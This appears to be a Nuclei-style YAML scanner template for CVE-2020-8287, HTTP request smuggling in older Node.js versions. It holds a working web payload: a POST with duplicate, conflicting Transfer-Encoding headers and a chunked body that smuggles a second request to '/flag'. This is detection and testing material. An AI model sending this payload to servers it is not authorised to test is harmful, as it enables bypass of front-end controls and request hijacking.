id: CVE-2020-8287

info:
  name: Node.js HTTP Request Smuggling (CVE-2020-8287)
  author: ProjectDiscoveryAI
  severity: medium
  description: Node.js versions before 10.23.1, 12.20.1, 14.15.4, 15.5.1 allow two copies of a header field in an HTTP request, leading to HTTP Request Smuggling.

http:
  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      Host: "{{Hostname}}"
      Transfer-Encoding: "chunked"
      Transfer-Encoding: "chunked-false"
    body: |
      1
      A
      0

      GET /flag HTTP/1.1
      Host: "{{Hostname}}"
      foo: x
    matchers:
      - type: word
        words:
          - "HTTP/1.1 200 OK"
        part: body